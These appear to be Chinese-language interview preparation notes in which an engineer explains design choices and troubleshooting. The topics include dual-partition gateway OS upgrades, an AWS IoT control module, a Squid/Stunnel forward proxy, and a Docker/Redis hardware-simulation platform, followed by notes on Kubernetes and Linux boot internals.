<p><strong>构建升级包</strong><br>难点1: 分区如何设计?<br>为了支持双系统, 需要对磁盘重新分区, 怎么保证两个分区独立运行互不干扰, 升级之后用户数据不会丢失.<br>我们的做法是, 用LVM逻辑卷将磁盘分出四个逻辑分区, root和back作为两个系统分区(50G)，data分区存储公共数据，image分区(20G)存储镜像<br>用逻辑卷是为了客户后期可以扩容.</p>
<p>难点2: 构建升级包过程中, 如何保证文件系统完整性和一致性, 怎么样用最小代价<br>导出虚拟机OVA文件, 挂载VMDK, 再对整个文件系统打包, 计算sha256sum (直接在运行机器上打包会出现不一致的问题)<br>注意: 打包时保留numericID(目标系统新增用户时, 用户UID与当前系统可能不一致), 和文件扩展属性xattr(保留snap运行状态)</p>
<p><strong>网络配置同步</strong>.<br>难点: 升级前后需要同步很多配置, 确保无缝升级, 其中网络配置的同步比较复杂, 通过简单复制文件方式难以实现同步<br>比如说某些客户的设备配置了双网卡, 这些设备从CentOS升级到Rocky, 概率出现网络不通问题, 升级后eth0和eth1两个网卡顺序错误, 导致网络不通</p>
<p>原因: 现代Linux系统使用基于硬件信息（如PCI总线地址）的可预测网卡命名规则，保证OS升级后网卡顺序的正确性。<br>但是我们的网关设备采用的是传统的eth网卡命名规则，好处是客户配置网络时无需指定网卡名称, 但是这种规则并不能保证网卡顺序的正确性。<br>解决方法: 升级前用ethtool记录每个网卡的总线信息businfo, 如果升级后网卡的总线不正确, 用modprobe按正确顺序加载网卡驱动; (如果两个网卡驱动相同, 还需要修改udev规则)</p>
<p><strong>GRUB启动项设置</strong><br>难点: 当两个分区的GRUB版本不一致的时候, 如何正确生成两个启动项<br>我们选择安装较新版本的GRUB, 因为新版本的引导程序可以兼容旧的CentOS 7, 步骤：</p>
<ul>
<li>先备份当前&#x2F;boot分区</li>
<li>使用目标系统的&#x2F;boot引导两个系统的内核。</li>
<li>通过chroot进入目标系统, 配置并安装GRUB</li>
<li>如果在这个过程中GRUB配置失败，通过之前备份的&#x2F;boot分区内容自动恢复到升级前状态</li>
</ul>
<p><strong>遇到了哪些问题</strong><br>问题1: 升级后用户无法登录, Microk8s启动失败 (打包时没有添加numeric-owner参数, 没有保留snap的xattr属性)<br>问题2: 升级后网络不通, 双网卡顺序颠倒<br>问题3: GRUB配置了10秒超时, 但是重启后启动菜单没有显示 (找了一份源码编译, 打印日志, 发现问题, 是menu_auto_hide环境变量问题</p>
<h2><span id="2-通过定制initramfs进入紧急模式-预先将升级包备份到内存后再重建磁盘分区-实现了从单系统分区到双系统的无缝迁移-大幅提升了用户体验">2. 通过定制initramfs进入紧急模式, 预先将升级包备份到内存后再重建磁盘分区, 实现了从单系统分区到双系统的无缝迁移, 大幅提升了用户体验</span></h2><p><strong>主要难点是什么, 如何解决的</strong><br>我们设计了一个双分区的升级方案, 但是早期客户设备只有一个系统分区。 我们要解决一个问题: 如何让客户的网关设备从单分区无缝迁移到双分区. 它的难点在于:<br>如果直接在原系统上重新划分分区，会导致数据丢失, 因为根分区在系统启动后是挂载状态，无法直接卸载或修改</p>
<p>为了解决这个问题, 我设计了一个基于initramfs的原地迁移方案<br>通过定制initramfs进入紧急模式，先挂载磁盘, 把升级包从磁盘复制到临时内存<br>再重新建立双分区, 解压临时内存中的升级包到根分区, 同步客户配置<br>最后重新配置和安装GRUB, 执行reboot完成OS迁移</p>
<p>实施这个方案的时候, 遇到一个难点:<br>initramfs使用的是内存空间, 而客户机器内存是有限的, 最低内存只有8G, 必须保证升级包及其解压后文件远小于8G, 避免因为内存不足导致迁移失败. 我们采用了一些做法，比如:</p>
<ul>
<li>使用CentOS 7 miminal ISO做升级包, 这个ISO只有900M</li>
<li>导出虚拟机时, 只分配必要磁盘空间, 等客户机器迁移成功后再自动分配剩余空间</li>
<li>清理临时文件, 日志文件, 禁用交换分区</li>
<li>使用压缩比率高的算法, 我们选的xz<br>最终我们的升级包大小是1.7G, 实测运行内存在4G左右, 没有出现客户因内存不足导致的迁移失败</li>
</ul>
<p><strong>为什么用这个方案, 有没有别的方案</strong><br>平行迁移, 部署一套全新的系统，然后将数据和配置从旧系统迁移到新系统。 我们没有采用, 因为需要客户手动安装配置设备, 做不到无缝迁移</p>
<p><strong>遇到了哪些问题</strong><br>仍然有少量客户(几十个）迁移失败, 比如:</p>
<ul>
<li>磁盘有坏道, 这种只能建议重装</li>
<li>客户网络问题, 升级后因为网络原因没有注册, 让客户手动注册解决问题<br>两万客户, 迁移失败的几十个, 迁移成功率99.5%以上</li>
</ul>
<h2><span id="3-开发了一个运行在网关设备上的控制模块-利用aws-iot消息队列实现在线升级等功能-并通过心跳检测方法解决微服务同步的问题-引入预下载机制提高升级的稳定性">3. 开发了一个运行在网关设备上的控制模块, 利用AWS IoT消息队列实现在线升级等功能, 并通过心跳检测方法解决微服务同步的问题; 引入预下载机制提高升级的稳定性</span></h2><p><strong>主要难点是什么, 如何解决的</strong><br>为了实现虚拟设备的在线升级, 服务安装等功能, 我们开发了一个运行于网关设备上的控制模块, 控制模块包含一个Python的后台进程和cronjob脚本.<br>后台进程订阅AWS IoT消息队列, 接收云端的升级消息, 然后根据消息类型把任务发送到到相应的Python队列中, 由不同线程处理任务<br>对于固件升级, 服务安装这类耗时长任务, 我们生成一个taskfile到磁盘, 交给cronjob处理</p>
<p>最大的难点是, 如何在客户设备完成固件升级后, 自动恢复客户之前安装的微服务, 从而实现无缝升级.<br>为了解决这个问题，我们引入了心跳检测机制: 让云端每5分钟通过消息队列给网关设备发送一次心跳消息, 设备完成升级后，会在心跳响应中带上版本号,<br>云端收到响应后通过检查版本号确认升级完成，再下发安装微服务的消息, 确保升级过程对用户来说是无感知的</p>
<p><strong>为什么引入消息队列, 为什么选择AWS IoT</strong><br>实现云端和网关设备之间的解耦通信, 云端只需要把任务发送到消息队列, 无需和每个虚拟设备直接交互, 降低耦合度，提高可维护性<br>实现异步处理, 云端无需等待任务执行完成, 从而提高系统响应速度</p>
<p>稳定性和可靠性, AWS IoT由Amazon提供的成熟方案, 我们后端也是基于AWS EKS部署的, 所以使用AWS IoT解决方案<br>易于部署和维护, AWS IoT是完全托管服务, 不需要部署实例<br>成本低, 费用就是消息传输费(每百万条价格1美元), 所有site每月300美金<br>不选择RabbitMQ和Kafka: 费用较高, 按照实例和存储收费, 增加复杂性, 有额外成本</p>
<p><strong>预下载机制</strong><br>升级时候发现一个问题, 有很多用户会在同一个时间设置定时升级, 集中下载造成客户瞬时网络流量大, 增加升级失败概率<br>为了解决这个问题, 我们设计了预下载机制, 把下载升级包和执行升级两个过程分开, 对不同的客户设置随机的预下载时间，<br>定为发布前12小时的某一个时间点, 分散了客户下载行为，提高稳定性</p>
<p><strong>遇到了哪些问题</strong><br>客户NTP不稳定, 系统时间不正确导致AWS IoT连接失败<br>解决方法: 控制模块通过一个线程，请求后端获取IoT连接状态, 如果是断连状态, 且系统时间差超过半小时, 立即设置系统时间</p>
<h2><span id="4优化了微服务的集成方案-将微服务从虚拟设备固件中解耦-并使用microk8s-ingress提供统一的访问入口-将虚拟设备镜像从45g压缩至27g-客户安装时间缩短了40">4.优化了微服务的集成方案, 将微服务从虚拟设备固件中解耦, 并使用Microk8s Ingress提供统一的访问入口, 将虚拟设备镜像从4.5G压缩至2.7G, 客户安装时间缩短了40%</span></h2><p><strong>主要难点是什么, 如何解决的</strong><br>在早期版本中, 微服务是通过RPM包方式集成在网关设备固件中, 导致网关设备镜像非常大, 有4.5G左右, 客户安装很慢, 体验很差。<br>为了解决这个问题, 我们优化了微服务的集成方案, 将微服务从网关设备固件中解耦<br>首先设计了一个统一的部署标准, 要求每个微服务团队提供一个标准化的tar.gz的部署包, 包括Docker镜像和YAML资源两部分, 发布到AWS S3上<br>每个微服务分配了一个serviceCode，网关设备根据这个serviceCode创建同名的Namespace, 实现各微服务间的资源隔离<br>为了从集群外部访问服务, 我们使用Microk8s Ingress插件作为统一入口, 所有HTTP请求通过宿主机的80和443端口进入, 并基于URL路径进行路由, 避免端口冲突问题</p>
<p><strong>为什么用Ingress</strong><br>Microk8s原生支持Ingress插件, 部署方便. Ingress可以实现基于路径的路由, 为外部访问集群内服务提供统一入口,<br>使用hostnetwork模式, 所有请求通过宿主机的80和443端口进入, 避免多个微服务端口冲突</p>
<p><strong>遇到了哪些问题</strong><br>小概率出现升级失败, namespace不退出, workaround检测异常强制删除</p>
<h2><span id="5-怎么使用诊断命令定位网络问题">5. 怎么使用诊断命令定位网络问题</span></h2><p>网络问题(SG断连):<br>ping测试, nslookup查DNS, 查看网卡配置, 路由表, iptables规则, curl -v查看输出, 检查代理</p>
<h2><span id="项目中还有什么优化的">项目中还有什么优化的</span></h2><ul>
<li>优化微服务的升级流程, 使用Helm Chart部署微服务, Helm Upgrade实现滚动更新</li>
<li>精简微服务基础镜像, 使用轻量级基础镜像, 提升微服务安装速度</li>
</ul>
<h2><span id="项目中团队成员组成">项目中团队成员组成</span></h2><p>10人团队:<br>1名项目经理, 负责整体项目规划, 识别需求, 管理进度<br>1名资深工程师, 为整个团队提供技术指导, 参与关键设计方案的讨论<br>3名开发, 我负责网关设备特性开发, 1位同事负责前端，1个同事负责后端<br>2名QA和OPS, 负责测试, 版本发布<br>其余几名同事负责其他微服务的开发</p>
<h2><span id="你做了哪些部分-哪些是合作的-如何合作">你做了哪些部分, 哪些是合作的, 如何合作</span></h2><p>和团队资深开发讨论设计方案<br>和后端同事讨论虚拟设备和云端的通信方案, 比如消息格式, REST API<br>和QA合作, 每次实现一个新功能或修复BUG时, 向QA详细说明修改内容和测试方法, 从而提高测试效率<br>和TS合作,处理客户案例时, 积极和TS沟通客户的问题, 提供解决方案<br>Stunnel加密方案, Cloud proxy部分是别的团队做的</p>
<h1><span id="项目2-forward-proxy-service">项目2: Forward Proxy Service</span></h1><h2><span id="简单介绍项目">简单介绍项目</span></h2><p>Forward Proxy Service是一个部署在服务网关上的正向代理服务, 为客户终端上云提供统一出口. 它解决了客户需逐一为每个终端配置防火墙策略的痛点, 同时实现了一个Air Gap（终端网络隔离, 通过代理上云）的解决方案. Forward Proxy单个服务实例支持3万个并发连接  </p>
<h2><span id="基于squid搭建了支持basic认证和白名单配置的正向代理服务-通过acl规则拦截非法请求-增强了系统的安全性">基于Squid搭建了支持Basic认证和白名单配置的正向代理服务, 通过ACL规则拦截非法请求, 增强了系统的安全性</span></h2><p><strong>如何实现Basic认证</strong><br>Basic认证就是用户名密码认证, 通过HTTP头 Proxy-Authorization携带用户名密码<br>每个客户有一个APIKEY(UUID), 对user+apikey做SHA1算法加密得到密码, </p>
<p><strong>为什么需要白名单, 如何实现的</strong><br>比如说客户某个终端感染了恶意软件，试图访问外部的恶意网站，白名单机制会直接阻止这些请求，防止客户防火墙没有配置策略导致可疑请求泄露.<br>利用Squid的ACL(Access Control List)功能实现了基于URL的访问控制, 预设了一个FQDN的白名单, 支持域名和IP, 域名支持开头通配符，比如<code>*.trendmicro.com</code><br>客户可以通过UI添加白名单, 白名单规则存储在ConfigMap, ConfigMap挂载到Pod文件系统上<br>我们在Pod中做了一个agent进程, 检测到白名单配置更新时, 修改Squid配置文件, 重新加载Squid</p>
<p><strong>为什么选择Squid, 有没有其他方案</strong><br>选择Squid, 是综合考虑开发难度, 成熟度, 社区支持, 功能需求<br>Squid是一个老牌的正向代理, 在企业场景中经过了长期验证, 成熟稳定, 社区支持好<br>Squid支持正向代理、基于 URL 的访问控制、Basic 认证, 配置简单, 无需插件<br>Squid能够支持数万的并发连接, 符合我们需要<br>没有选Nginx, 因为需要额外模块实现正向代理, ACL, 配置较复杂</p>
<p><strong>单个服务实例支持高达3万个并发连接, 如何保证这种并发能力的</strong><br>事件驱动模型: 通过异步非阻塞方式处理多个连接, 基于epoll和非阻塞IO, 一个进程处理上万连接<br>多进程架构： 通过多进程架构进一步并发能力。 主进程监听客户端连接, 将连接分发给多个工作进程, 充分利用多CPU计算能力<br>内存优化: 使用内存池减少频繁内存分配释放, 对HTTP响应进行缓存</p>
<p><strong>惊群现象是什么，怎么保证每个新连接只会一个工作进程处理</strong><br>多个进程都在等待同一个事件, 一旦事件发生, 所有进程都会唤醒, 但实际上只有一个进程能成功处理该事件, 其他进程则会阻塞或重新等待, 导致不必要的性能损失<br>Squid启用SO_REUSEPORT, 由内核自动将新连接分配给监听同一个端口的不同进程</p>
<p>Nginx中通过accept_mutex防止惊群现象, 每个工作进程都有机会获得锁, 一旦某个工作进程持有锁，其他进程不会尝试接收新连接, 知道进程释放锁<br>Nginx启动时分配一块共享内存区, 工作进程都可以访问这块内存，工作进程通过原子操作CAS获得锁</p>
<h3><span id="分析并迅速解决客户网络不通的问题-涉及http隧道和tls握手原理">分析并迅速解决客户网络不通的问题, 涉及HTTP隧道和TLS握手原理</span></h3><p><strong>为啥代理不用HTTPS的呢</strong><br>因为HTTP就可以跑TLS流量, 没必要用HTTPS代理<br>用HTTPS还有生成HTTPS证书, 维护证书, 引入不必要复杂性</p>
<p><strong>说一下HTTP隧道的原理</strong><br>HTTP隧道解决一个问题, HTTP proxy怎么代理HTTPS的流量, 它的流程是:</p>
<ul>
<li>客户端和代理服务器三次握手, 建立TCP连接</li>
<li>客户端发送HTTP CONNECT请求给代理, 告诉代理自己需要连接的目标服务器</li>
<li>代理收到请求后, 和目标服务器建立TCP隧道</li>
<li>代理返回200 Connection Established给客户端, 告诉客户端整个隧道已经建立</li>
<li>隧道建立后, 代理服务器只负责在客户端和服务间之间转发数据，不解析或修改数据。这保证了 HTTPS 数据的安全性，即使代理也无法解密 TLS 加密的内容（因为代理不知道密钥, 没有服务器的私钥)</li>
</ul>
<p><strong>说一下TLS握手的原理</strong><br>HTTPS是基于HTTP的安全协议, 通过在HTTP和TCP层加入了TLS协议实现数据加密, TLS握手步骤:</p>
<ul>
<li>客户端发送ClientHello，包含支持的TLS版本, 加密套件, 客户端随机数</li>
<li>服务器返回serverHello，选择双方都支持的TLS版本和加密套件，并附带自己的随机数和证书</li>
<li>客户端校验服务器证书, 如果校验通过</li>
<li>就根据选定的加密算法(RSA或DH算法)，客户端和服务端协商一个对称的会话密钥</li>
<li>最后双方使用协商出的对称密钥进行加密通信</li>
</ul>
<p><strong>详细描述下客户网络不通的问题, 如何利用这些原理解决网络问题的</strong><br>难点:<br>网络不通问题时, 可能有多个故障点, 包括终端设备, 网关设备, 客户防火墙, 目标服务器等.<br>每个客户网络环境都是不确定的, 这增加了问题定位难度</p>
<p>我们遇到典型案例包括：<br>案例1: 端点访问云端失败, Squid代理日志显示 200 OK, 但抓包发现TLS握手失败, 没有发Server Hello<br>客户终端通过Forward Proxy代理访问云端服务时网络不通. 从Squid日志中看到请求状态码为200 OK，但响应数据包大小仅为40多个字节，远小于正常预期值<br>让终端同事配合复现问题, 在网关设备上用tcpdump抓包, 发现TLS握手过程中, client hello发送了，但是没有收到server hello, 这说明TLS握手存在问题<br>用wireshark查包内容，发现客户端和目标服务器使用的TLS加密套件不匹配, 导致TLS握手失败</p>
<p>案例2: 有的客户防火墙开启了HTTPS监控, 做了中间人, 导致证书校验不通过<br>当防火墙作为中间人拦截HTTPS流量时，它会用自己的证书替换原始服务器的证书, 我们网关设备不会信任客户防火墙证书, 所以无法建立连接<br>我们在CLI上开发了一个诊断命令行, 通过curl打印请求详细信息，如果证书是一个IP或者防火墙厂商，说明客户防火墙做了中间人, 让客户关闭这个功能</p>
<p>案例3: 访问特定FQDN时出现超时或返回5XX错误(502 Bad Gateway, 503 Service Unavaliable)<br>原因是客户防火墙配置有问题, 没有放行这个FQDN, 如果丢弃报文就是超时，拒绝就会返回5XX错误</p>
<p>访问了白名单之外的FQDN, 返回 403<br>代理认证不通过, 返回407<br>访问的FQDN被反火枪阻挡, 5XX错误 (超时或拒绝)</p>
<h3><span id="设计了一个基于stunnel的加密通信方案-显著减少了因客户防火墙配置异常导致的网络问题-极大提升了用户体验">设计了一个基于Stunnel的加密通信方案, 显著减少了因客户防火墙配置异常导致的网络问题, 极大提升了用户体验</span></h3><p><strong>背景</strong><br>在本地终端访问是云端资源时，涉及到大量的FQDN（例如 *.trendmicro.com）。<br>然而，一些客户的防火墙比较老旧，不支持基于FQDN的通配符匹配。<br>这些客户必须手动逐个配置每个FQDN，这不仅繁琐，而且容易遗漏或出错，导致网络被防火墙阻挡，严重影响用户体验。</p>
<p><strong>方案</strong><br>针对这个问题，我们设计了一种基于Stunnel的加密通信方案. Stunnel是一个开源软件，提供TLS加密服务; 我们使用Stunnel绕过客户防火墙的限制。<br>部署架构: 在客户防火墙内部署Squid + Stunnel Client, 在防火墙外部部署Stunnel Server + Squid</p>
<p>由于流量都通过Stunnel加密通道传输，客户不再需要在防火墙山上给逐一指定目标服务器的FQDN，只需允许通往Stunnel服务器443端口的流量即可<br>避免了防火墙通过明文HTTP CONNECT报文或TLS握手过程中的Client Hello报文中的SNI字段识别目标服务器的问题。</p>
<p><strong>为什么不能只用Squid？</strong><br>如果仅在防火墙外部部署Squid, 防火墙可以通过分析HTTP CONNECT报文识别目标服务器，从而对特定域名进行拦截<br>TLS握手过程中Client Hello报文中的SNI字段也会暴露目标服务器信息，导致防火墙能够识别并拦截特定域名</p>
<p><strong>有哪些改进的地方</strong><br>尽管Stunnel提供了强大的加密功能，但在高并发场景下可能会出现性能瓶颈。<br>优化措施是水平扩展：通过增加更多的Stunnel实例（SG）来分散负载，提高系统的整体处理能力。</p>
<p><strong>Squid日志和监控</strong><br>为了确保系统的稳定运行，我们实施了以下日志记录和监控措施：</p>
<ul>
<li>健康检查：使用Kubernetes的livenessProbe机制，定时检测Pod的健康状态。定义一个HTTP GET请求，每隔一段时间检查一次Squid的运行状态。</li>
<li>日志管理：通过Kubernetes的PersistentVolume机制, 将Squid的日志挂载到宿主机，便于后续问题定位</li>
</ul>
<p><strong>如何测试的</strong><br>8vCPU&#x2F;12G&#x2F;500G&#x2F;1000Mbps<br>1000台agent并发升级, 流量157M<em>1000, 30分钟下载完毕<br>CPU 8%, Mem 58%, Disk 1%，峰值内存7G，瓶颈在带宽<br>157</em>8&#x2F;(30*60) &#x3D; 700Mbps, 相当于1Gpbs网卡</p>
<h1><span id="项目3-matrix仿真平台">项目3: Matrix仿真平台</span></h1><p>Matrix是一个基于Docker的单板仿真平台, 运用XML建模技术和Redis驱动仿真, 支持全产品形态四十多块单板的仿真. 该平台使得100多名开发和测试人员无需依赖物理设备即可进行软件测试.<br>Matrix平台易于部署，可以轻松安装在每个开发人员的Linux机器上，显著提升了日常开发和测试效率, 并节省了物料成本。  </p>
<p><strong>背景</strong><br>在设备管理领域，传统的测试方法通常需要几台设备共享给上百个开发人员使用，每次测试排队时间很长, 测试一次耗时半小时以上，极大地限制了开发效率。<br>为了解决这一痛点，我们开发了Matrix仿真平台, 让每个开发可以在自己工作机器上快速测试代码, 节省排队和测试时间, 提高开发失效率<br>作为设备管理部门，我们的业务代码依赖于底层的驱动接口，因此在仿真环境中必须设计一种方法模拟这些驱动接口。 为了满足测试人员灵活构造各种故障的需求，驱动接口不能是硬编码的<br>整体架构</p>
<p><strong>Matrix平台的整体架构是什么样的？</strong><br>仿真平台部署在开发人员的Linux机器上，包含一个启动脚本, 一组模型文件, 一个仿真设备包<br>用户执行启动脚本，拉起一个管理容器, 这个管理容器中安装了Redis数据库，用于驱动接口仿真<br>管理容器读取模型文件, 获取需要拉起的仿真单板信息, 把单板属性写到Redis数据库, 再把相应的单板容器拉起来, 把仿真设备包解压到单板容器 </p>
<p><strong>XML建模技术具体如何应用的</strong><br>XML文件定义每个单板的属性, 比如单板类型, 在位状态,<br>管理容器启动后, 读取XML文件内容把单板数据以字符串形式写到Redis, 比如1号单板类型对应的key就是”&#x2F;Chassis$#1&#x2F;board#1&#x2F;board_type”</p>
<p><strong>为什么选择Docker</strong><br>项目的主要目标是为开发和测试人员提供一个轻量级的仿真环境，而不是构建高可用、多集群的生产环境。<br>Docker使用简单，对开发和测试人员来说学习成本低</p>
<p><strong>为什么用Redis不用MySQL</strong><br>Redis是基于内存的数据库，性能非常高。本项目的数据规模大约为2万个key，QPS峰值可达1万左右，Redis可以满足需求<br>Redis的key-value模型非常适合模拟驱动接口的行为（如get&#x2F;set操作），而MySQL作为关系型数据库需要先建表，灵活性较差。我们的驱动接口主要依赖于简单的键值操作，因此Redis更加灵活方便<br>Redis支持多种数据类型（如string、list、set、zset、hash），相比Memcached仅支持string类型，Redis功能更强大；而MongoDB是文档型数据库，更适合文档存储，不适合我们当前的应用场景<br>Redis支持发布订阅和键空间通知功能，我们在项目中利用Redis特性实现了单板插拔流程的仿真验证，无需引入其他中间件, 使系统简单易于维护</p>
<p><strong>Redis驱动仿真API的具体功能, 怎么实现动态故障注入</strong>*<br>在设备管理领域，测试人员需要一种简单且可靠的方法来动态修改驱动接口的行为，以便模拟各种故障场景进行测试<br>传统的做法是利用华为内部的一个C语言库进行函数动态插桩，但在我们设备管理领域，这种方法会出现替换失败的情况，不可靠<br>为了解决这些问题，我们设计了一种基于Redis的方案，通过Redis动态改变驱动接口行为，实现故障注入</p>
<p>具体来说，我们使用Hiredis（一个C语言开源库）开发了一组读写Redis key的API，用于模拟驱动接口的行为。<br>由于被测组件也是so库，集成Hiredis非常方便。例如，要将1号单板设置为“不在位”状态，只需修改Redis key “&#x2F;board#1&#x2F;present_status” 的值为 false 即可，无需修改驱动代码或重新编译。<br>相比旧的插桩方案，新方法不仅更加稳定可靠，还极大地简化了故障注入的操作流程，使得测试人员可以快速灵活地构造各种故障场景，显著提高了测试效率和可靠性。</p>
<h2><span id="通过redis键空间通知机制-模拟了单板插拔的仿真-并通过自定义网桥模拟框式形态的仿真-扩展了仿真平台的测试范围">通过Redis键空间通知机制, 模拟了单板插拔的仿真, 并通过自定义网桥模拟框式形态的仿真, 扩展了仿真平台的测试范围</span></h2><p><strong>Redis键空间通知机制是如何帮助模拟单板插拔仿真的？</strong><br>为了在仿真环境测试单板插拔场景, 需要模拟相关驱动函数行为.<br>在真实的设备管理业务中，当发生单板插拔事件时，驱动会通过回调通知设备管理进程。</p>
<p>在仿真环境中，我们需要模拟驱动行为, 如果直接用轮询方式检查Redis中的单板在位状态会导致不必要的CPU开销。 为了解决这一问题，我们利用了Redis的键空间通知机制，具体流程如下：<br>设备管理进程订阅1号单板是否在位的频道”Board1&#x2F;present_status’, 每当该键发生变化时，Redis都会发送通知。<br>模拟单板插入时，把表示单板在位的Redis key值置为on, 触发Redis键空间通知<br>Redis将通知消息发布给所有在线的消费者（即设备管理进程）。设备管理进程收到订阅消息后，触发业务回调，从而感知到单板插拔事件的发生。</p>
<p>利用Redis的键空间通知机制, 实现了单板插板场景仿真, 避免轮询方式带来CPU浪费， 同时没有引入额外中间件, 保持系统的简洁</p>
<p><strong>接口设计</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef void (*hiredisSubCallback) (hiredisSubContext *cxt);</span><br><span class="line">int HiredisSubscribe(const char *key, hiredisSubCallback cb, hiredisSubContext *cxt);</span><br></pre></td></tr></table></figure>
<ul>
<li>订阅频道 subscribe  <strong>keyspace@0</strong>:&#x2F;board#1&#x2F;present_status”</li>
<li>创建线程，循环读取redis回复, 收到回复后调用回调</li>
</ul>
<p><strong>自定义网桥是如何实现框式形态仿真的？</strong><br>在框式设备仿真中，单板间的通信需要使用特定的172.16网段, Docker默认的docker0网桥使用的是172.17<br>为了避免修改客户Docker配置或重启服务，我们创建了一个自定义网桥，指定其IP段为172.16，将所有单板容器连接到这个网桥上。 通过这种方式，容器间可以直接通过172.16 IP段通信，模拟了真实设备的网络环境。</p>
<p>Docker间通信原理是，每个容器通过一对虚拟以太网接口（veth对）与宿主机上的自定义网桥通信<br>veth pair由两个虚拟网络接口组成，一端位于宿主机的网络命名空间（network namespace），另一端位于容器的网络命名空间。<br>当容器启动时，Docker会自动创建veth pair，并将其一端连接到容器内部的eth0接口，另一端连接到宿主机上的自定义网桥。<br>这样，容器内的网络流量可以通过自定义网桥在不同容器之间传输，实现高效的局域网通信。</p>
<h2><span id="将redis驱动接口从短连接优化为长连接-接口平均读写时间从2ms缩短为01ms-显著提升了测试效率">将Redis驱动接口从短连接优化为长连接, 接口平均读写时间从2ms缩短为0.1ms, 显著提升了测试效率</span></h2><p><strong>将Redis驱动接口从短连接优化为长连接</strong><br>在项目初期，驱动接口通过Redis短连接实现，导致频繁建立和关闭连接。特别是在设备管理子卡初始化代码中，需要查询大量属性时，影响测试效率<br>为了解决这个问题，我们将短连接优化为长连接。 通过互斥锁, 让一个进程的所有线程共用一个长连接。 最终将驱动接口的平均一次读写时间从2ms缩短到0.1ms，显著提升了性能。</p>
<p><strong>如何测量和验证平均一次读写时间从2ms缩短至0.1ms的效果？</strong><br>在测试环境, 直接修改C代码, 用time_t计算时间差,</p>
<h2><span id="其他问题">其他问题</span></h2><p><strong>举一个问题定位案例</strong><br>当时遇到一个Redis key被意外删除, 导致驱动接口行为不符合预期的问题 </p>
<p>我们通过常规的查看日志, tcpdump抓包方法, 没有找到原因.<br>我当时看过REDIS的单机数据库实现, 想到既然Redis是基于内存的数据库，字符串键肯定在进程中的某个内存地址处，key丢失时这个地址的内容肯定被改写<br>所以我只需要GDB打个断点，看下调用栈不就搞定了<br>后来发现是REDIS配置项maxmemory过低, 只给了1M, 导致Redis认为空间不够就随机淘汰了一些key, 修改了这个配置项后问题得到了解决</p>
<p><strong>你负责哪些部分, 怎么和其他团队成员合作的</strong><br>这个工具是合作完成的<br>早期设计阶段, 有1个架构师, 1个SE, 我参与项目设计和方案讨论, 梳理业务做原型验证，和架构,SE讨论方案。<br>连我在内, 有两个开发，另一个开发来自杭州。 我负责驱动接口仿真和Redis，另一个同事负责Docker镜像, 仿真设备包构建</p>
<p>后期的性能优化也是合作的，连我在内有3名开发，在同一个部门的业务组。 我做方案设计, 梳理流程拓扑, 把开发任务分解到2名开发同事去做。</p>
<p><strong>你觉得还有什么优化</strong></p>
<ul>
<li>优化内存。比如对字符串键做压缩存储（因为Redis字符串键的三种编码: long, embstr,raw）</li>
<li>优化请求速度，有些驱动函数会一次性读写多个key，用mset, mget命令代替get, set, 减少客户端和Redis的通信次数</li>
</ul>
<p><strong>Redis挂了怎么办, 可靠性怎么考虑</strong><br>每个单板1个容器，作为redis client; 1个管理容器，安装redis数据库<br>如果Redis挂了，管理容器会检测到异常，并依次重启管理容器和各个单板容器。<br>由于这是仿真环境大部分驱动数据是易失性的，无需持久化或集群支持; 对于需要持久化数据, 通过写文件和Docker Volume方式存储</p>
<h1><span id="技能描述">技能描述</span></h1><h2><span id="docker网络模式及容器间通信的原理">Docker网络模式及容器间通信的原理</span></h2><p>Bridge模式是默认的网络模式，为单个主机上的容器提供网络通信服务。当容器启动时，Docker会自动创建一个虚拟网桥docker0，<br>并通过veth对将容器连接到这个网桥上。每个容器都会获得一个独立的IP地址，并且可以通过网桥进行相互通信<br>Overlay网络则是用于多主机环境下容器间的通信。它通过在网络层建立一个虚拟网络<br>比如说使用VXLAN技术封装数据包以跨越多个主机传输</p>
<h2><span id="nginx-ingress">Nginx Ingress</span></h2><p>Nginx Ingress解决的问题是从集群外部如何访问集群内的某个服务<br>它的原理是, 在Microk8s里运行了一个Nginx Ingress Controller, 监听k8s中的Ingress资源，当检测到Ingress资源更新时, 动态更新Nginx配置文件<br>外部流量先到达Nginx, 再基于域名和URL将请求转发到Service, 最终把请求转发到具体的Pod</p>
<h2><span id="coredns原理">CoreDNS原理</span></h2><p>为Kubernetes集群内部的DNS解析提供服务，使得服务之间能够通过域名互相通信<br>Kubernetes集群中, CoreDNS是运行在kube-system这个namespace下的Pod<br>（同一个namespace的服务，直接用名称访问, 不同Namespace下的需要通过svc.namespaceX访问）<br>ClusterFirst, 优先使用CoreDNS的, 无法解析回退到宿主机<br>ClusterFirstWithHostNet, 使用宿主机网络Pod, 仍使用CoreDNS<br>Default 使用宿主机的DNS</p>
<h2><span id="calico网络模式">Calico网络模式</span></h2><p>k8s中, 主要解决Pod间通信问题, 支持三种模式, BGP, VXLAN, IPIP<br>在BGP模式下，Calico 使用标准的 BGP 协议来动态地学习和分发路由信息。<br>每个节点作为一个 BGP 路由器，直接与其他节点交换路由信息，从而允许容器之间的直接通信，无需额外的封装或隧道技术。这种方式减少了网络开销，提高了性能。<br>底层网络不支持BGP, 需跨越不同网络时, 使用VXLAN和IPIP模式, VXLAN 把原始二层帧封装在UDP报文, 实现不同网络Pod通信; IPIP模式在原始IP包外面再封装一层IP包, 实现跨子网通信</p>
<h1><span id="其他项目问题">其他项目问题</span></h1><h2><span id="说下linux启动流程">说下Linux启动流程</span></h2><ul>
<li>系统加电, BIOS开机自检, 自检完成后, 根据预设的启动顺序查找可启动设备（如硬盘、USB）</li>
<li>BIOS 找到第一个可启动设备后, 控制权交给引导程序 GRUB2</li>
<li>GRUB 将选定的内核镜像vmlinuz加载到内存, 挂载临时根文件系统 initramfs</li>
<li>内核初始化硬件设备, 通过initramfs加载必要模块, 挂载真实的根文件系统</li>
<li>执行用户空间第一个进程systemd, 由systemd负责启动其他进程</li>
</ul>
<h2><span id="grub什么原理">GRUB什么原理</span></h2><p>GRUB（GRand Unified Bootloader), Linux系统中广泛使用的引导加载程序, 负责加载操作系统内核到内存并启动<br>划分3阶段, Stage 1, Stage 1.5, Stage 2, 其中Stage 2是GRUB的核心部分，包含用户界面、配置文件解析器以及加载内核和initrd的工具。<br>当选择了启动菜单中的某个条目后, GRUB会将指定的kernel和initrd加载到内存中, 内核被加载到内存后, 控制权转移给内核, 继续启动流程</p>
